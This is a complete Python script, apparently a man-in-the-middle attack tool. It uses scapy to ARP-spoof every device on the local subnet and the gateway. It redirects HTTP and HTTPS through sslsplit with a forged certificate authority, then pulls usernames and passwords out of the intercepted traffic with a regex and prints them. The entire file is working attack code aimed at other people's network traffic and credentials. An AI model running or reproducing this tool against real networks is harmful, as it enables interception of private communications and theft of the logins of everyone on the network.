#!/usr/bin/env python3

import scapy.all as scapy
import time, sys, re, subprocess, os, threading

local_ip = scapy.get_if_addr(scapy.conf.iface)  # default interface
local_mac = scapy.get_if_hwaddr(scapy.conf.iface) # default interface
gateway_ip = scapy.conf.route.route("0.0.0.0")[2]
target_domain  = gateway_ip + "/24" # all the ip in subnet

def spoofing(target, spoof):
    packet = scapy.Ether(src=local_mac, dst=target['mac']) / scapy.ARP(hwsrc=local_mac, psrc=spoof['ip'], hwdst=target['mac'], pdst=target['ip'], op=2)
    scapy.sendp(packet,verbose = False)
    
def restore(target, source):
    packet = scapy.Ether(src=source['mac'], dst=target['mac']) / scapy.ARP(hwsrc=source['mac'], psrc=source['ip'], hwdst=target['mac'], pdst=target['ip'], op=2)
    scapy.sendp(packet,verbose = False)

def scan(ip):
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    result = scapy.srp(packet, timeout=3, verbose=0)[0]
    victims = []

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        victims.append({'ip': received.psrc, 'mac': received.hwsrc})

    return victims

def sslsplit():
    subprocess.run("iptables -t nat -F;" + "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080;" 
		+ "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443",shell=True)
    subprocess.run("touch /tmp/sslsplit",shell=True) # create a temporary file to store HTTPS content
    subprocess.Popen("sslsplit -D -L /tmp/sslsplit -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080",shell=True,universal_newlines=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)

    f = open("/tmp/sslsplit", "rb")
    while True:
        line = f.readline().decode(errors='ignore')
        matchObj = re.search( r'username=(.*)&password=(.*)&', line, re.I)
        if matchObj:
            print("[*] Victim send the possible id and password to the website")
            print("Username: " + matchObj.group(1))
            print("Password: " + matchObj.group(2))
    f.close()


def main():
    if os.geteuid() != 0:
        print("./mitm_attack: Permission denied")
        print("Try sudo ./mitm_attack")
        return

    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True) # enable ip forward

    # find the mac address of gateway
    victims = scan(target_domain)
    for victim in victims:
        if victim['ip'] == gateway_ip: gateway = victim
    
    # print clients
    print("Available devices in the network:")
    print("----------------------------------------------")
    print("IP" + " "*18+"MAC")
    print("----------------------------------------------")
    for victim in victims:
        if victim != gateway:
            print("{:16}    {}".format(victim['ip'], victim['mac']))

    t1 = threading.Thread(target=sslsplit)
    t1.daemon = True
    t1.start()

    try:
        print("[*] ARP spoofing...")
        while True:
            for victim in victims:
                if victim != gateway:
                    spoofing(victim,gateway) # tell victim we are router
                    spoofing(gateway,victim) # tell router we are victim
            time.sleep(2)
    except KeyboardInterrupt:
        subprocess.run("iptables -t nat -F",shell=True) # clear the iptables
        print("[*] Sucessfully restoring iptables")
        print("[*] ARP spoofing is terminated, restoring ARP table")
        for victim in victims:
            if victim != gateway:
                restore(victim, gateway)
                restore(gateway, victim)
        print("[*] Sucessfully restoring ARP table")
        subprocess.run("rm /tmp/sslsplit",shell=True) # delete temporary file
        sys.exit() # this will also stop all the daemon threads

if __name__ == '__main__':
	main()